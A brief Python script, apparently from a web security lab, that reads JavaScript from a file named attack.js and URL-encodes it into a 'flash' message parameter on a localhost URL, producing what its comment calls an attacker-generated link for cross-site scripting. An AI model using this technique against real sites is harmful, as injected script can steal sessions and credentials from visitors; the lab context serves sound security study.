from urllib.parse import urlencode
with open('attack.js') as f: #generates an attacker-generated URL
    query = {'flash': 'Thanks. brandon'+f.read().strip().replace('\n', ' ')}

print('http://localhost:5000/?' + urlencode(query))